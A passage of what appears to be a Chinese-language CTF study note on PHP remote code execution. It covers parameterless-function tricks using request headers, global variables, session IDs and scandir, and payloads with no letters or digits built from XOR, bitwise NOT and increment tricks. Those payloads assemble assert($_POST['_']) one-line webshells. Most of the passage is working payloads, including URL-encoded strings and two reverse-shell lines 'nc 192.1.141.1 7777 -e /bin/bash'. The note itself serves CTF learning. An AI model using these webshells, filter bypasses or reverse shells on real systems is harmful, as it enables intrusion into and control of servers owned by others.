class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br><span class="line">  url = baseurl+<span class="built_in">str</span>(i)</span><br><span class="line">  s.get(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">list</span> <span class="number">2</span>:</span><br><span class="line">  time.sleep(<span class="number">1</span>)</span><br><span class="line">  url = baseurl+<span class="built_in">str</span>(j)</span><br><span class="line">  s.get(url)</span><br><span class="line"></span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh x&quot;</span>)</span><br><span class="line">s.get(baseurl+<span class="string">&quot;sh g&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="无参数命令"><a href="#无参数命令" class="headerlink" title="无参数命令"></a>无参数命令</h1><h2 id="请求头RCE"><a href="#请求头RCE" class="headerlink" title="请求头RCE"></a>请求头RCE</h2><ul>
+<li>HTTP请求头<br><a href="https://garlic-dove.github.io/2025/11/20/%E8%AE%A4%E8%AF%86Web/">蒜鸟的笔记1</a><br>函数：<code>getallheaders()</code>和<code>apache_request_headers()</code></li>
+<li>利用全局变量进REC</li>
+<li>利用session</li>
+<li>使用<code>scandir()</code>进行文件读取（只能进行文件读取）<br><a href="#scandir%E8%AF%BB%E5%8F%96">scandir读取</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//有参数函数命令执行报错</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">eror_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>=== <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//匹配&#x27;;&#x27;=== preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;,&#x27;&#x27;,$_GET[&#x27;code&#x27;]成功则调用eval执行code</span></span><br></pre></td></tr></table></figure>
+<strong>解析</strong>  <blockquote>
+<p><code>preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;,&#39;&#39;,$_GET[&#39;code&#39;])</code><br>只要在code里匹配到<code>[^\W]+\((?R)?\)</code>（a()、a(b(c(…）)))）则替换为空  </p>
+<p><code>[^\W]+\((?R)?\)</code><br>表示a()、a(b(c(…)))形式的字符串<br><code>[^\W]</code>：正则表达式匹配字母、数字、下划线（A<del>Z、a</del>z、_）<br><code>[^\W]+\(?\)</code>：匹配“a()”形式的字符串，但是“()”里面没有任何参数<br><code>(?R)</code>：代表递归a(b(c(…)))</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>利用Burpsuite</strong></p>
+<ul>
+<li><code>getallheaders()</code>：获取所有HTTP请求标头</li>
+<li><code>apache_request_headers()</code>：功能和<code>getallheaders()</code>相似，适用于Apache</li>
+<li><code>pos()</code>：第一项的值显示出来</li>
+<li><code>end()</code>：把最后一项的值显示出来<br>在请求中Request的行数顺序在Response看来是相反的是相反的，即Request中的最后一行在Response被视为第一行，所以要显示Request最后一行应该使用函数<code>pos()</code>要显示第一行就用<code>end()</code>。<br>用Burpsuite修改请求头的函数和参数（Connection）可以实现命令执行</li>
+</ul>
+<h2 id="全局变量RCE"><a href="#全局变量RCE" class="headerlink" title="全局变量RCE"></a>全局变量RCE</h2><p><strong>关联</strong>&rArr;<a href="#%E8%AF%B7%E6%B1%82%E5%A4%B4rce">请求头RCE</a><br>函数<code>get_defined_vars()</code>：返回所有已经定义<strong>变量的值</strong>，所组成的数组</p>
+<blockquote>
+<p>?code&#x3D;print_r(get_defined_vars());<br>返回数组顺序为GET&rarr;POST&rarr;COOKIE&rarr;FILES（每一行一个数组）</p>
+</blockquote>
+<blockquote>
+<p>?code&#x3D;print_r(pos(get_defined_vars()));<br><code>pos()</code>只获取第一行GET变量的值</p>
+</blockquote>
+<blockquote>
+<p>?code&#x3D;print_r(pos(get_defined_vars()));&amp;cmd&#x3D;system(‘ls’);<br><code>&amp;</code>加入想要执行的指令</p>
+</blockquote>
+<blockquote>
+<p>?code&#x3D;print_r(end(pos(get_defined_vars())));&amp;cmd&#x3D;system(‘ls’);<br><code>end()</code>获取GET的最后一行cmd的值<code>system(&#39;ls&#39;)</code></p>
+</blockquote>
+<blockquote>
+<p>?code&#x3D;assert(pos(get_defined_vars()));&amp;cmd&#x3D;system(‘ls’);<br>把<code>print_r</code>换成<code>eval</code>、<code>assert</code>就可以执行命令<code>system(&#39;ls&#39;)</code>  </p>
+</blockquote>
+<p><u>也可以用pos(pos())获取数组FILES的部分来执行指令</u></p>
+<h2 id="session-RCE"><a href="#session-RCE" class="headerlink" title="session RCE"></a>session RCE</h2><p><strong>关联</strong>&rArr;<a href="#%E8%AF%B7%E6%B1%82%E5%A4%B4rce">请求头RCE</a>和<a href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8Frce">全局变量RCE</a><br>函数<code>srssion_start()</code>：启动新会话或重用现有会话，成功开始会话返回TRUE（1），反之返回FALSE（0）</p>
+<blockquote>
+<p>?code&#x3D;print_r(session_start());<br>返回1或0<br>?code&#x3D;print_r(session_id(session_start()));<br>返回PHPSESSID的值<br>可以利用Burpsuiet修改PHPSESSID的值</p>
+</blockquote>
+<blockquote>
+<p>?code&#x3D;show_source(session_id(session_start()));<br>可以利用Burpsuiet修改PHPSESSID的值为.&#x2F;flag，用<code>show_source()</code>读取flag文件源代码</p>
+</blockquote>
+<blockquote>
+<p>?code&#x3D;eval(hex2bin(session_id(session_start())));<br>如果只是修改PHPSESSID的值为命令<code>phpinfo();</code>是无法执行的<br>需要把命令<code>phpinof();</code>HEX编码转换为十六进制（706870696e666f28293b），写入PHPHSESSID<br><code>hex2bin()</code>函数将十六进制转换为二进制数，用<code>eval()</code>执行</p>
+</blockquote>
+<h2 id="scandir读取"><a href="#scandir读取" class="headerlink" title="scandir读取"></a>scandir读取</h2><p><code>scandir()</code>：在某文件路径下，把内容以列表形式显示出来，列出指定路径中的文件和目录</p>
+<blockquote>
+<p>其他函数：</p>
+<ul>
+<li><code>getcwd()</code>：取得当前工作目录</li>
+<li><code>current()</code>：返回数组中第一个元素的当前值</li>
+<li><code>array_reverse()</code>：返回单元顺序相反的数组</li>
+<li><code>array_flip()</code>：交换数组中的键和值（比如第一个数为3，用该函数变成第三个数为1）</li>
+<li><code>next()</code>：将数组中的内容指针向前移动</li>
+<li><code>array_rand()</code>：从数组中随机取出一个或多个随机键</li>
+<li><code>chdir()</code>：系统调用函数（同cd），用于改变当前工作目录</li>
+<li><code>strrev()</code>：用于反转给定的字符串</li>
+<li><code>crypt()</code>：用来来加密，目前Linux平台上加密的方法大致有MD5，DES，3 DES</li>
+<li><code>hebrevc()</code>：把希伯来文本从右至左的流转换为左至右的流</li>
+</ul>
+</blockquote>
+<p><strong>查看相对目录文件名</strong></p>
+<blockquote>
+<p>?code&#x3D;print_r(localeconv());<br><code>localeconv()</code>：显示数组第一项（如果是“.”）  </p>
+<p>?code&#x3D;print_r(current(localeconv()));<br>和<code>pos()</code>相似  </p>
+<p>?code&#x3D;print_r(scandir(current(localeconv())));<br><code>scandir()</code>：读取当前目录“.”下所有文件名</p>
+<p>?code&#x3D;print_r(current(array_reverse(scandir(current(localeconv())))));<br>可以显示在最后一项需要的文件  </p>
+<p>?code&#x3D;show_source(current(array_reverse(scandir(current(localeconv())))));<br>读取目标文件的内容</p>
+</blockquote>
+<p><strong>查看绝对路径文件名</strong>  </p>
+<blockquote>
+<p>?code&#x3D;print_r(getcwd());<br><code>getcwd()</code>：获取当前目录<br>?code&#x3D;print_r(scandir(getcwd()));<br>?code&#x3D;print_r(end(scandir(getcwd())));…<br><code>end()</code>显示最后一项；其他步骤相似</p>
+</blockquote>
+<p><strong>读取绝对路径上一级目录文件名</strong>  </p>
+<blockquote>
+<p>?code&#x3D;print_r(dirname(getcwd()));<br><code>dirname()</code>：当前的上一级目录</p>
+</blockquote>
+<p>在当前目录执行读取上一级文件内容的指令，系统会报错，因为当前目录找不到上一级目录的文件。</p>
+<blockquote>
+<p><strong>定位到上一级目录</strong>：<code>chdir()</code><br>?code&#x3D;show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));<br>随机读取上一级目录的任意文件内容  </p>
+<p>其他表达方式：<br>?code&#x3D;show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));<br>?code&#x3D;show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</p>
+</blockquote>
+<p><strong>捕捉&#x2F;读取</strong></p>
+<blockquote>
+<p>?code&#x3D;print_r(serialize(array()));<br><code>serialize()</code>：序列化<code>array()</code>  </p>
+<p>?code&#x3D;print_r(crypt(serialize(array())));<br><code>crypt()</code>：单向字符串散列加密，结果随机  </p>
+<p>?code&#x3D;print_r(strrev(crypt(serialize(array()))));<br><code>strrev()</code>：反转字符串，让最后一个字符&#x2F;在第一个  </p>
+<p>查看根目录文件名<br>?code&#x3D;print_r(chr(ord(strrev(crypt(serialize(array()))))));<br><code>ord()</code>&#x2F;<code>chr()</code>：只能对第一个字符进行编码&#x2F;解码</p>
+</blockquote>
+<p><strong>利用Burpsuite</strong><br>因为读取的随机性，可以用Burpsuite进行暴力破解  </p>
+<ul>
+<li>执行读取上一级目录（根目录）的任意文件内容的命令前对数据包进行拦截，把数据包发送给intruder  </li>
+<li>在Payload中的Payload type改为Numbers</li>
+<li>Number range设置读取次数</li>
+<li>修改数据包的一点细节（框选攻击目标，在这里不影响结果），然后start attack</li>
+</ul>
+<p>为了读取的更准确，可以在chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))外添加dirname(chdir())来巩固读取</p>
+<h1 id="无字母数字绕过"><a href="#无字母数字绕过" class="headerlink" title="无字母数字绕过"></a>无字母数字绕过</h1><p><strong>例题</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;  <span class="comment">//a-z0-9过滤字母和数字</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="异或运算绕过"><a href="#异或运算绕过" class="headerlink" title="异或运算绕过"></a>异或运算绕过</h2><p><strong>异或运算</strong>：<code>a⊕b</code></p>
+<blockquote>
+<p>如果a、b两个值不相同，则异或结果为1。如果两个值相同，则结果为0。（二进制）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="keyword">echo</span><span class="string">&quot;5&quot;</span>^<span class="string">&quot;Z&quot;</span>;  <span class="comment">//结果为o</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>使用符号进行异或运算，获取值</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">echo</span><span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_</span>=<span class="string">&quot;5&quot;</span>^<span class="string">&quot;Z&quot;</span>;  <span class="comment">//_=o</span></span><br><span class="line"><span class="variable">$_</span>();  <span class="comment">//执行o()函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>异或运算生成脚本</strong>：把一个函数的字符串分成无字母和数字的俩部分（ASCII码）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line"><span class="variable">$result1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$result2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$c</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> ture;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>例子解释</em></p>
+<blockquote>
+<p>phpinfo&#x3D;”+(+).&amp;&#x2F;“^”[@[@@@@”<br><code>?cmd=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;();</code>无法执行  </p>
+<p><code>?cmd=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</code>需要url编码后才可以执行  </p>
+</blockquote>
+<blockquote>
+<p><strong>一句话木马</strong><br><code>assert($_POST[&#39;_&#39;])</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$a</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">&gt;<span class="variable">$b</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line">&gt;<span class="variable">$c</span> = <span class="variable">$$b</span>;  <span class="comment">//$c = &#x27;$_POST&#x27;</span></span><br><span class="line">&gt;<span class="variable">$a</span>(<span class="variable">$c</span>[<span class="string">&#x27;_&#x27;</span>]);  <span class="comment">//assert($_POST[&#x27;_&#x27;])</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>a、b、c分别换成_、__、___。assert和_POST进行无字母和数字转换</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$_</span> = <span class="string">&quot;!((%)(&quot;</span>^<span class="string">&quot;@[[@[\\&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$__</span> = <span class="string">&quot;!+/((&quot;</span>^<span class="string">&quot;~&#123;`&#123;|&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$___</span> = <span class="variable">$$__</span>;</span><br><span class="line">&gt;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="string">&#x27;_&#x27;</span>]);  <span class="comment">//assert($_POST[&#x27;_&#x27;])</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br><span class="line">&gt;<span class="comment">//_=system(&#x27;ls&#x27;)：执行ls指令</span></span><br></pre></td></tr></table></figure>
+<p><code> `$_POST\`;</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$_</span> = <span class="string">&#x27;_POST&#x27;</span>;</span><br><span class="line">&gt;<span class="variable">$__</span> = <span class="variable">$$_</span>;</span><br><span class="line">&gt;`<span class="variable">$__</span>[_]`;  <span class="comment">//``不能回显（监听）</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>POST替换为<code>&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</code><br>&#96;&#96;?cmd&#x3D;$_&#x3D;”!+&#x2F;((“^”~{&#96;{|”;$__&#x3D;$$</em>;<code>$__[_]</code>;&#96;&#96;<br>POST提交<code>_=nc 192.1.141.1 7777 -e /bin/bash</code>：shell反弹<br>POST提交<code>_=touch a</code>：验证攻击有效<br>shell反弹读取结果需要<a href="#">监听操作</a></p>
+</blockquote>
+<h2 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h2><p><code>~()</code>：字符的ASCII码取反（二进制：0&rarr;1；1&rarr;0）<br><strong>中文字符串ASCII码取反形成指令</strong></p>
+<blockquote>
+<p>assert关联的中文字符串是“极区区皮十勺”</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$a</span> = <span class="string">&quot;极&quot;</span>;</span><br><span class="line">&gt;<span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$a</span>);  <span class="comment">//将二进制数据转换为十六进制表示</span></span><br><span class="line">&gt;<span class="keyword">echo</span> ~(<span class="variable">$a</span>&#123;<span class="number">1</span>&#125;);  <span class="comment">//把a的中间一个字节取反</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>“极”的二进制数据以十六进制表达为“e69e81”三个字节（0位e6，1位9e，2位81），“9e”的二进制数据取反后ASCII码值为97，对应的字符为a。</p>
+</blockquote>
+<p>构造<code>assert($_POST[&#39;_&#39;])</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>++;  <span class="comment">//得到1，此时$_=1</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;极&quot;</span>;</span><br><span class="line"><span class="variable">$___</span>=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到a，此时$___=&quot;a&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;区&quot;</span>;</span><br><span class="line"><span class="variable">$___</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到s，此时$___=&quot;as&quot;</span></span><br><span class="line"><span class="variable">$___</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//此时$___=&quot;ass&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;皮&quot;</span>;</span><br><span class="line"><span class="variable">$___</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到e，此时$___=&quot;asse&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;十&quot;</span>;</span><br><span class="line"><span class="variable">$___</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到r，此时$___=&quot;asser&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;勺&quot;</span>;</span><br><span class="line"><span class="variable">$___</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到t，此时$___=&quot;assert&quot;</span></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;  <span class="comment">//$____=&quot;_&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;寸&quot;</span>;</span><br><span class="line"><span class="variable">$____</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到P，此时$____=&quot;_P&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;小&quot;</span>;</span><br><span class="line"><span class="variable">$____</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到O，此时$____=&quot;_PO&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;欠&quot;</span>;</span><br><span class="line"><span class="variable">$____</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到S，此时$____=&quot;_POS&quot;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&quot;立&quot;</span>;</span><br><span class="line"><span class="variable">$____</span>.=~(<span class="variable">$__</span>&#123;<span class="variable">$_</span>&#125;);  <span class="comment">//得到T，此时$____=&quot;_POST&quot;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;  <span class="comment">//$_=$_POST</span></span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]);  <span class="comment">//assert($_POST[_])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>URL编码</strong></p>
+<blockquote>
+<p>assert的URL编码：%9e%8c%8c%9a%8d%8b<br>_POST的URL编码：%a0%af%b0%ac%ab  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$_</span>=~(<span class="string">&quot;%9e%8c%8c%9a%8d%8b&quot;</span>);</span><br><span class="line">&gt;<span class="variable">$__</span>=~(<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>);</span><br><span class="line">&gt;<span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line">&gt;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);  <span class="comment">//assert($_POST[_])</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>?cmd=$_=~(&quot;%9e%8c%8c%9a%8d%8b&quot;);$__=~(&quot;%a0%af%b0%ac%ab&quot;);$___=$$__;$_($___[_]);</code><br>POST提交_&#x3D;phpinfo();（要执行的指令）</p>
+</blockquote>
+<p><code> `$_POST[_]`;</code></p>
+<blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$__</span>=~(<span class="string">&quot;%a0%af%b0%ac%ab&quot;</span>);</span><br><span class="line">&gt;<span class="variable">$___</span> =<span class="variable">$$__</span>;</span><br><span class="line">&gt;`<span class="variable">$___</span>[_]`;  <span class="comment">//`_POST[_]`（``不能回显）</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>POST提交<code>_=nc 192.1.141.1 7777 -e /bin/bash</code>：shell反弹<br>POST提交<code>_=touch a</code>：验证攻击有效<br>shell反弹读取结果需要<a href="#%E7%9B%91%E5%90%AC%E6%93%8D%E4%BD%9C">监听操作</a></p>
+</blockquote>
+<h2 id="字增绕过"><a href="#字增绕过" class="headerlink" title="字增绕过"></a>字增绕过</h2><p><code>++</code>：自增，只要得到A，就可以自增得到A~Z</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = A;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>++;  <span class="comment">//输出A，但$a=B</span></span><br><span class="line"><span class="keyword">echo</span> ++<span class="variable">$a</span>;  <span class="comment">//输出C</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>怎么获得A</strong></p>
+<blockquote>
+<p><code>$_=[]</code>：默认代表Array，但这是一个函数，不是字符串数组，需要转换</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">&lt;?php</span></span><br><span class="line">&gt;<span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;  <span class="comment">//[]数组用.拼接空字符串&#x27;&#x27;强制转换成字符串</span></span><br><span class="line">&gt;<span class="keyword">echo</span> <span class="variable">$_</span>[<span class="variable">$__</span>];  <span class="comment">//$__变量不存在，默认0，数组0则为A</span></span><br><span class="line">&gt;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造<code>assert($_POST[&#39;_&#39;])</code></p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$_</span>[<span class="variable">$__</span>];<span class="variable">$__</span>=<span class="variable">$___</span>;<span class="variable">$_</span>=<span class="variable">$___</span>;  <span class="comment">//$_=$__=&#x27;A&#x27;</span></span><br><span class="line">++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;  <span class="comment">//$__=&#x27;O&#x27;</span></span><br><span class="line"><span class="variable">$_____</span>=<span class="variable">$__</span>;  <span class="comment">//存储O</span></span><br><span class="line">++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;  <span class="comment">//$__=&#x27;S&#x27;</span></span><br><span class="line"><span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;  <span class="comment">//ASS</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$___</span>;  <span class="comment">//重新自增，$__=&#x27;A&#x27;</span></span><br><span class="line">++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span 